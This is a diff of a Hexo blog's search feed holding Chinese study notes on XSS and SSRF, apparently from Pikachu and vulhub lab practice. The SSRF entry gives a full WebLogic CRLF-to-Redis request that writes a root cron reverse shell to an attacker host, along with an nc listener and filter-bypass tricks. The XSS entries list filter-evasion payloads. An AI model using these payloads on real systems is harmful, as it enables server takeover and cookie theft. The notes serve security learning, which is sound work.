-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">$name=preg_replace(&quot;/<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">/i&quot;,&quot;&quot;,$name);    //不区分大小写过滤 <span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">$name=preg_replace(<span class="string">&quot;/&lt;\/script&gt;/i&quot;</span>,<span class="string">&quot;&quot;</span>,$name);  <span class="comment">//不区分大小写过滤 </span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>payload<code>&lt;scr&lt;script&gt;ipt&gt;alert(&#39;hack&#39;)&lt;/scr&lt;/script&gt;ipt&gt;</code></p>
-<h4 id="过滤所有内容"><a href="#过滤所有内容" class="headerlink" title="过滤所有内容"></a>过滤所有内容</h4><p>其他源码同上</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">$name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); //过滤了&lt;script及其之间的所有内容</span><br></pre></td></tr></table></figure>
-<p>虽然script标签不能使用了，但img、body等标签的事件或者 iframe 等标签的 src 注入恶意的 js 代码</p>
-<p>payload<code>&lt;img src=1 οnerrοr=alert(&#39;hack&#39;)&gt;</code></p>
-<p>其他继续补充</p>
-<h3 id="利用手段"><a href="#利用手段" class="headerlink" title="利用手段"></a>利用手段</h3><p>盗取cookie</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://c.biancheng.net/view/3274.html">HTML DOM是什么</a></p>
-<p><a href="https://blog.csdn.net/witwitwiter/article/details/115797971">Pikachu靶场：DOM型XSS以及DOM型XSS-X</a></p>
-<p><a href="https://www.cnblogs.com/fairyting/p/12630548.html">DOM型XSS（pikachu）</a></p>
-<p><a href="https://blog.csdn.net/qq_35393693/article/details/86597707">XSS(跨站脚本)漏洞详解之XSS跨站脚本攻击漏洞的解决</a></p>
-]]></content>
-      <categories>
-        <category>xss</category>
-      </categories>
-      <tags>
-        <tag>xss</tag>
       </tags>
   </entry>
   <entry>
@@ -1771,97 +1712,6 @@
       <tags>
         <tag>rce</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>常见web漏洞学习之SSRF</title>
-    <url>/2021/07/15/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BSSRF/</url>
-    <content><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p><img src="https://i.loli.net/2021/07/17/FxWvNe42sRnGHqt.png" alt="image-20210717161639133"></p>
-<p><img src="https://i.loli.net/2021/07/17/smd1vkM65KeSaHn.png" alt="image-20210717161814292"></p>
-<p><img src="https://i.loli.net/2021/07/17/UvSWRuVZxiHkomn.png" alt="image-20210717161911196"></p>
-<p><img src="https://i.loli.net/2021/07/17/HsaJXe45FlEY9cL.jpg" alt="img"></p>
-<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>Server Side Request Forgery 服务端请求伪造</p>
-<p>是由攻击者构造形成并由服务端发起恶意请求的一个安全漏洞。因为恶意请求由服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF攻击的目标是从外网无法访问的内部系统</p>
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>很多web应用都提供了从其他的服务器上获取数据的功能，如使用指定的url，web应用就可以获取图片，下载文件，读取文件内容等（这个url是远程的url，并不是本地的，<del>说了个废话</del>）</p>
-<p>SSRF的实质是<strong>利用存在缺陷的web应用作为代理来进行攻击</strong>远程和本地的服务器</p>
-<p>SSRF形成的原因大都是由于服务端<strong>提供了从其他服务器应用获取数据的功能</strong>且没有<strong>对目标地址做过滤与限制</strong></p>
-<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p><img src="https://i.loli.net/2021/07/18/HKf8lbk4BOJeNdA.jpg" alt="9907e251f785494d92c746eb5df60541"></p>
-<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul>
-<li>内外网的端口和服务扫描</li>
-<li>对内网Web应用进行指纹识别，识别企业内部的资产信息，通过访问默认文件实现(如：readme文件)</li>
-<li>攻击运行在内网或服务器本地的其他应用程序，如redis、mysql等</li>
-<li>利用Redis未授权访问，HTTP CRLF注入实现getshell</li>
-<li>下载内网资源，利用file协议读取本地敏感数据文件等</li>
-<li>进行跳板</li>
-</ul>
-<h3 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h3><ul>
-<li>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</li>
-<li>http/https协议：探测内网主机存活</li>
-<li>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</li>
-<li>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</li>
-</ul>
-<h3 id="weblogic-ssrf复现"><a href="#weblogic-ssrf复现" class="headerlink" title="weblogic ssrf复现"></a>weblogic ssrf复现</h3><h4 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h4><p><img src="https://i.loli.net/2021/07/18/64S8lLxKy1sbThH.png" alt="image-20210718153704526"></p>
-<p>查看靶场说明</p>
-<p>进入weblogic的ssrf的目录下，使用<code>gedit</code>命令查看<code>README.md</code></p>
-<p><img src="https://i.loli.net/2021/07/18/NioHV94KcWQdUkC.png" alt="image-20210718154456328"></p>
-<p>xshell会让提示下Xmanger</p>
-<p><img src="https://i.loli.net/2021/07/18/AdLikoaK5s18p9V.png" alt="image-20210718154647511"></p>
-<p>直接下本地看</p>
-<p>访问<code>ip:7001/uddiexplorer/</code>，无需登录即可查看uddiexplorer应用</p>
-<p><img src="https://i.loli.net/2021/07/18/SlbMwNYxXPvj9aQ.png" alt="image-20210718155843581"></p>
-<p>访问<code>ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p>
-<p>​    <img src="https://i.loli.net/2021/07/18/E3xOf6zXK4kup1G.png" alt="image-20210718160744237"></p>
-<h4 id="探测内网状态"><a href="#探测内网状态" class="headerlink" title="探测内网状态"></a>探测内网状态</h4><p><img src="https://i.loli.net/2021/07/18/aQI3ivkAp8MFUcV.png" alt="image-20210718162349626"></p>
-<p>构造payload来检验端口是否开放并且是否为HTTP协议<code>operator=http://127.0.0.1:7001</code>，返回<code>status code</code>就说明端口开放并且为HTTP协议</p>
-<p><img src="https://i.loli.net/2021/07/18/r2c6UPX3liFnHxC.png" alt="image-20210718162817388"></p>
-<p>尝试一个不存在的端口<code>7777</code>，返回<code>could not connect over HTTP to server</code>，就是说明端口不存在</p>
-<p><img src="https://i.loli.net/2021/07/18/1MaoVAP6WU9kXwd.png" alt="image-20210718163712297"></p>
-<p>如果端口开放访问的是非http协议，则会返回<code>did not have a valid SOAP content-type</code></p>
-<p><img src="https://i.loli.net/2021/07/18/a921AiY4epylb5h.png" alt="image-20210718164622656"></p>
-<p>在查看Redis端口开放状态时，一直不行，看一下才发现是没有起来</p>
-<p><img src="https://i.loli.net/2021/07/18/JcSrjMtdWQusE89.png" alt="image-20210718171022778"></p>
-<h4 id="探测Redis端口情况"><a href="#探测Redis端口情况" class="headerlink" title="探测Redis端口情况"></a>探测Redis端口情况</h4><p>首先，通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*），发现<code>172.18.0.1:6379</code>可以连通：</p>
-<blockquote>
-<p>也可以写个脚本跑一下</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/07/18/nDTQKp3m9Zro1uH.png" alt="image-20210718171256048"></p>
-<h4 id="注入HTTP头，利用Redis反弹shell"><a href="#注入HTTP头，利用Redis反弹shell" class="headerlink" title="注入HTTP头，利用Redis反弹shell"></a>注入HTTP头，利用Redis反弹shell</h4><p>Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入<code>%0a%0d</code>来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器</p>
-<h4 id="发送Redis命令，将弹shell脚本写入-etc-crontab"><a href="#发送Redis命令，将弹shell脚本写入-etc-crontab" class="headerlink" title="发送Redis命令，将弹shell脚本写入/etc/crontab"></a>发送Redis命令，将弹shell脚本写入<code>/etc/crontab</code></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;公网ip&#x2F;port 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir &#x2F;etc&#x2F;</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-
-
-<h5 id="对其进行url编码"><a href="#对其进行url编码" class="headerlink" title="对其进行url编码"></a>对其进行url编码</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F公网ip%2F监听端口%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave</span><br></pre></td></tr></table></figure>
-<p>注：换行符是“\r\n”，也就是“%0D%0A”</p>
-<blockquote>
-<p>\r是回车，\n是换行</p>
-</blockquote>
-<p>将url编码后的字符串放在ssrf域名后面，go</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;172.18.0.1:6379&#x2F;test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F公网ip%2F监听端口%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/07/18/4B1TI6QFdS7uNtH.png" alt="image-20210718201905032"></p>
-<p><code>nc -lvp 4444</code></p>
-<p>可进行利用的cron还有以下几个地方</p>
-<ul>
-<li>/etc/crontab 这个是肯定的</li>
-<li>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li>
-<li>/var/spool/cron/root centos系统下root用户的cron文件</li>
-<li>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</li>
-</ul>
-<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><ol>
-<li><p>@　　　　　　　　　　<a href="http://abc.com@127.0.0.1/">http://abc.com@127.0.0.1</a></p>
-</li>
-<li><p>添加端口号　　　　　　<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></p>
-</li>
-<li><p>短地址　　　　　　　　<a href="https://0x9.me/cuGfD">https://0x9.me/cuGfD</a></p>
-</li>
-<li><p>可以指向任意ip的域名　 xip.io</p>
-</li>
-<li><p>ip地址转换成进制来访问 192.168.0.1=32322</p>
-</li>
-</ol>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.freebuf.com/company-information/220086.html">SSRF漏洞攻击原理及防御方案</a></p>
-<p><a href="https://www.t00ls.net/articles-41070.html">SSRF漏洞(原理&amp;绕过姿势)</a></p>
-<p><a href="https://blog.csdn.net/weixin_41679427/article/details/110312158">SSRF攻击姿势汇总</a></p>
-<p><a href="https://blog.csdn.net/lhh134/article/details/88298881">Weblogic SSRF漏洞（CVE-2014-4210）</a></p>
-<p><a href="https://blog.csdn.net/weixin_46789316/article/details/116531565">漏洞复现-vulhub复现Weblogic的SSRF漏洞</a></p>
-]]></content>
   </entry>
   <entry>
     <title>常见web漏洞学习之文件上传知识点总结</title>
@@ -2040,6 +1890,97 @@
       </tags>
   </entry>
   <entry>
+    <title>常见web漏洞学习之SSRF</title>
+    <url>/2021/07/15/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BSSRF/</url>
+    <content><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p><img src="https://i.loli.net/2021/07/17/FxWvNe42sRnGHqt.png" alt="image-20210717161639133"></p>
+<p><img src="https://i.loli.net/2021/07/17/smd1vkM65KeSaHn.png" alt="image-20210717161814292"></p>
+<p><img src="https://i.loli.net/2021/07/17/UvSWRuVZxiHkomn.png" alt="image-20210717161911196"></p>
+<p><img src="https://i.loli.net/2021/07/17/HsaJXe45FlEY9cL.jpg" alt="img"></p>
+<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>Server Side Request Forgery 服务端请求伪造</p>
+<p>是由攻击者构造形成并由服务端发起恶意请求的一个安全漏洞。因为恶意请求由服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF攻击的目标是从外网无法访问的内部系统</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>很多web应用都提供了从其他的服务器上获取数据的功能，如使用指定的url，web应用就可以获取图片，下载文件，读取文件内容等（这个url是远程的url，并不是本地的，<del>说了个废话</del>）</p>
+<p>SSRF的实质是<strong>利用存在缺陷的web应用作为代理来进行攻击</strong>远程和本地的服务器</p>
+<p>SSRF形成的原因大都是由于服务端<strong>提供了从其他服务器应用获取数据的功能</strong>且没有<strong>对目标地址做过滤与限制</strong></p>
+<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p><img src="https://i.loli.net/2021/07/18/HKf8lbk4BOJeNdA.jpg" alt="9907e251f785494d92c746eb5df60541"></p>
+<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul>
+<li>内外网的端口和服务扫描</li>
+<li>对内网Web应用进行指纹识别，识别企业内部的资产信息，通过访问默认文件实现(如：readme文件)</li>
+<li>攻击运行在内网或服务器本地的其他应用程序，如redis、mysql等</li>
+<li>利用Redis未授权访问，HTTP CRLF注入实现getshell</li>
+<li>下载内网资源，利用file协议读取本地敏感数据文件等</li>
+<li>进行跳板</li>
+</ul>
+<h3 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h3><ul>
+<li>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</li>
+<li>http/https协议：探测内网主机存活</li>
+<li>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</li>
+<li>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</li>
+</ul>
+<h3 id="weblogic-ssrf复现"><a href="#weblogic-ssrf复现" class="headerlink" title="weblogic ssrf复现"></a>weblogic ssrf复现</h3><h4 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h4><p><img src="https://i.loli.net/2021/07/18/64S8lLxKy1sbThH.png" alt="image-20210718153704526"></p>
+<p>查看靶场说明</p>
+<p>进入weblogic的ssrf的目录下，使用<code>gedit</code>命令查看<code>README.md</code></p>
+<p><img src="https://i.loli.net/2021/07/18/NioHV94KcWQdUkC.png" alt="image-20210718154456328"></p>
+<p>xshell会让提示下Xmanger</p>
+<p><img src="https://i.loli.net/2021/07/18/AdLikoaK5s18p9V.png" alt="image-20210718154647511"></p>
+<p>直接下本地看</p>
+<p>访问<code>ip:7001/uddiexplorer/</code>，无需登录即可查看uddiexplorer应用</p>
+<p><img src="https://i.loli.net/2021/07/18/SlbMwNYxXPvj9aQ.png" alt="image-20210718155843581"></p>
+<p>访问<code>ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p>
+<p>​    <img src="https://i.loli.net/2021/07/18/E3xOf6zXK4kup1G.png" alt="image-20210718160744237"></p>
+<h4 id="探测内网状态"><a href="#探测内网状态" class="headerlink" title="探测内网状态"></a>探测内网状态</h4><p><img src="https://i.loli.net/2021/07/18/aQI3ivkAp8MFUcV.png" alt="image-20210718162349626"></p>
+<p>构造payload来检验端口是否开放并且是否为HTTP协议<code>operator=http://127.0.0.1:7001</code>，返回<code>status code</code>就说明端口开放并且为HTTP协议</p>
+<p><img src="https://i.loli.net/2021/07/18/r2c6UPX3liFnHxC.png" alt="image-20210718162817388"></p>
+<p>尝试一个不存在的端口<code>7777</code>，返回<code>could not connect over HTTP to server</code>，就是说明端口不存在</p>
+<p><img src="https://i.loli.net/2021/07/18/1MaoVAP6WU9kXwd.png" alt="image-20210718163712297"></p>
+<p>如果端口开放访问的是非http协议，则会返回<code>did not have a valid SOAP content-type</code></p>
+<p><img src="https://i.loli.net/2021/07/18/a921AiY4epylb5h.png" alt="image-20210718164622656"></p>
+<p>在查看Redis端口开放状态时，一直不行，看一下才发现是没有起来</p>
+<p><img src="https://i.loli.net/2021/07/18/JcSrjMtdWQusE89.png" alt="image-20210718171022778"></p>
+<h4 id="探测Redis端口情况"><a href="#探测Redis端口情况" class="headerlink" title="探测Redis端口情况"></a>探测Redis端口情况</h4><p>首先，通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*），发现<code>172.18.0.1:6379</code>可以连通：</p>
+<blockquote>
+<p>也可以写个脚本跑一下</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/07/18/nDTQKp3m9Zro1uH.png" alt="image-20210718171256048"></p>
+<h4 id="注入HTTP头，利用Redis反弹shell"><a href="#注入HTTP头，利用Redis反弹shell" class="headerlink" title="注入HTTP头，利用Redis反弹shell"></a>注入HTTP头，利用Redis反弹shell</h4><p>Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入<code>%0a%0d</code>来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器</p>
+<h4 id="发送Redis命令，将弹shell脚本写入-etc-crontab"><a href="#发送Redis命令，将弹shell脚本写入-etc-crontab" class="headerlink" title="发送Redis命令，将弹shell脚本写入/etc/crontab"></a>发送Redis命令，将弹shell脚本写入<code>/etc/crontab</code></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;公网ip&#x2F;port 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir &#x2F;etc&#x2F;</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="对其进行url编码"><a href="#对其进行url编码" class="headerlink" title="对其进行url编码"></a>对其进行url编码</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F公网ip%2F监听端口%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave</span><br></pre></td></tr></table></figure>
+<p>注：换行符是“\r\n”，也就是“%0D%0A”</p>
+<blockquote>
+<p>\r是回车，\n是换行</p>
+</blockquote>
+<p>将url编码后的字符串放在ssrf域名后面，go</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;172.18.0.1:6379&#x2F;test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F公网ip%2F监听端口%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/07/18/4B1TI6QFdS7uNtH.png" alt="image-20210718201905032"></p>
+<p><code>nc -lvp 4444</code></p>
+<p>可进行利用的cron还有以下几个地方</p>
+<ul>
+<li>/etc/crontab 这个是肯定的</li>
+<li>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li>
+<li>/var/spool/cron/root centos系统下root用户的cron文件</li>
+<li>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</li>
+</ul>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><ol>
+<li><p>@　　　　　　　　　　<a href="http://abc.com@127.0.0.1/">http://abc.com@127.0.0.1</a></p>
+</li>
+<li><p>添加端口号　　　　　　<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></p>
+</li>
+<li><p>短地址　　　　　　　　<a href="https://0x9.me/cuGfD">https://0x9.me/cuGfD</a></p>
+</li>
+<li><p>可以指向任意ip的域名　 xip.io</p>
+</li>
+<li><p>ip地址转换成进制来访问 192.168.0.1=32322</p>
+</li>
+</ol>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.freebuf.com/company-information/220086.html">SSRF漏洞攻击原理及防御方案</a></p>
+<p><a href="https://www.t00ls.net/articles-41070.html">SSRF漏洞(原理&amp;绕过姿势)</a></p>
+<p><a href="https://blog.csdn.net/weixin_41679427/article/details/110312158">SSRF攻击姿势汇总</a></p>
+<p><a href="https://blog.csdn.net/lhh134/article/details/88298881">Weblogic SSRF漏洞（CVE-2014-4210）</a></p>
+<p><a href="https://blog.csdn.net/weixin_46789316/article/details/116531565">漏洞复现-vulhub复现Weblogic的SSRF漏洞</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>端口那些事</title>
     <url>/2021/06/28/%E7%AB%AF%E5%8F%A3%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
     <content><![CDATA[<p>想要开放端口，要先去了解防火墙状态和网络命令</p>
@@ -2070,6 +2011,78 @@
 <h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/realjh/article/details/82048492">Linux下Centos7对外开放端口</a></p>
 <p><a href="https://www.cnblogs.com/heqiuyong/p/10460150.html">Centos7开放及查看端口</a></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>常见web漏洞学习之xss学习</title>
+    <url>/2021/07/11/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E4%B9%8Bxss%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="常见web漏洞学习之xss学习"><a href="#常见web漏洞学习之xss学习" class="headerlink" title="常见web漏洞学习之xss学习"></a>常见web漏洞学习之xss学习</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><blockquote>
+<p>跨站脚本攻击，就是将恶意代码嵌入到前端js代码中（反射型，DOM型）或是数据库中（存储型）当用户点击或访问就会触发xss代码执行，盗取用户cookies或session</p>
+</blockquote>
+<p>要注意的是可能存在浏览器的影响，会阻止js代码执行</p>
+<h3 id="测试流程"><a href="#测试流程" class="headerlink" title="测试流程"></a>测试流程</h3><ol>
+<li>找到注入点</li>
+<li>输入一组“特殊字符+唯一标识字符”，查看返回结果</li>
+<li>源码找到唯一标识字符，判断是否可以构造闭合</li>
+<li>结合绕过方式，执行</li>
+</ol>
+<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>反射型，存储型，DOM型</p>
+<p>简单来说，反射型就是构造的恶意代码由于过滤不严格，使得嵌入到前端js页面中进行执行</p>
+<p>玩玩<code>pikachu</code>靶场</p>
+<h4 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h4><p>输入长度被限制了，先将文本框的最大限制<code>20</code>改大些</p>
+<p><img src="/2021/07/11/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E4%B9%8Bxss%E5%AD%A6%E4%B9%A0/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210713160014148.png" alt="image-20210713160014148"></p>
+<p>以get方式提交的，可以直接在url中看到提交的xss</p>
+<p><img src="https://i.loli.net/2021/07/13/gGnOdl3j4VwhCYT.png" alt="image-20210713160325433"></p>
+<p><code>who is ,i don&#39;t care!</code></p>
+<p><img src="https://i.loli.net/2021/07/13/LzoJMXOQ5m1EDsH.png" alt="image-20210713162302066"></p>
+<p>看一下源码</p>
+<p><img src="https://i.loli.net/2021/07/13/yrfeQIFUT2hazOJ.png" alt="image-20210713162627176"></p>
+<h4 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h4><p>payload</p>
+<p><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
+<p><img src="/2021/07/11/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E4%B9%8Bxss%E5%AD%A6%E4%B9%A0/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210714152233253.png" alt="image-20210714152233253"></p>
+<p><img src="/2021/07/11/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E4%B9%8Bxss%E5%AD%A6%E4%B9%A0/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210714152544701.png" alt="image-20210714152544701"></p>
+<p>其他用户访问也会触发</p>
+<p>kali</p>
+<p><img src="https://i.loli.net/2021/07/14/Kn5ljP8gRMEQXGd.png" alt="image-20210714153107662"></p>
+<h5 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h5><p>反射型数据交互只和前端js代码，没有进行存储，而存储型则是被写入到了后端，其他用户访问也会中招</p>
+<h4 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h4><p>那什么是dom呢？简单来说dom就是通过层次分明的结果组织，来展示HTML标签抽象成代码里的对象，可以管理文档，增删改查规则，是一个HTML标准接口</p>
+<blockquote>
+<p>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/07/14/6UWiEYVygrubAkd.png" alt="image-20210714105849246"></p>
+<p>而dom型xss用一个例子来讲就是，页面中的”下一页按钮”点击之后并没有url的改变也就是参数没变，而是通过HTML代码中的dom来执行的</p>
+<p>输入特殊字符<code>&#39;&lt;&quot;&gt;666</code>被过滤为<code>666</code></p>
+<p><img src="https://i.loli.net/2021/07/14/vJkDzx3IaYmSFUK.png" alt="image-20210714120425068"></p>
+<p>查看源码</p>
+<p><img src="https://i.loli.net/2021/07/14/oj1wcUOyntbJMSN.png" alt="image-20210714120824574"></p>
+<p>结合源码构造payload效果为点击弹窗</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&#39;#&#39; onclick&#x3D;&quot;alert(&#39;xss&#39;)&quot;&gt;&#39;&gt;就让往事都随风,都随风吧&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+<p>payload</p>
+<p><code>#&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;</code></p>
+<p>点击<code>&#39;&gt;就让往事都随风,都随风吧</code></p>
+<p><img src="https://i.loli.net/2021/07/14/J84TmvBj1bE2lQR.png" alt="image-20210714151950066"></p>
+<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p>贴一段师傅源码</p>
+<p>区分大小写过滤<code>&lt;script&gt;</code>标签</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">//前端 1.html：</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>反射型XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 